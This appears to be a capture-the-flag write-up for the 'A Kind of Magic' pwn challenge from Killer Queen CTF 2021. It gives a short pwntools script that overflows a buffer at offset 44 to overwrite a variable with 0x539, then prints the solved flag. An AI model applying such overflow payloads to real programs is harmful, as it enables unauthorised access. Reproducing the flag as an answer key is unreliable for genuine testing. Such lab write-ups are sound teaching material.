---
name: A Kind of Magic (2021)
event: Killer Queen CTF 2021
category: Pwn
description: Writeup for A Kind of Magic (pwn) - Killer Queen CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# A Kind of Magic

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/xOHLniVJsJY/0.jpg)](https://youtu.be/xOHLniVJsJY?t=1806s "Killer Queen 2021: A Kind of Magic")

## Challenge Description

> You're a magic man aren't you? Well can you show me?

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './akindofmagic'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = 44

# Start program
io = start()

# Build the payload
payload = flat({
    offset: 0x539
})

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(':', payload)

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `flag{i_hope_its_still_cool_to_use_1337_for_no_reason}`
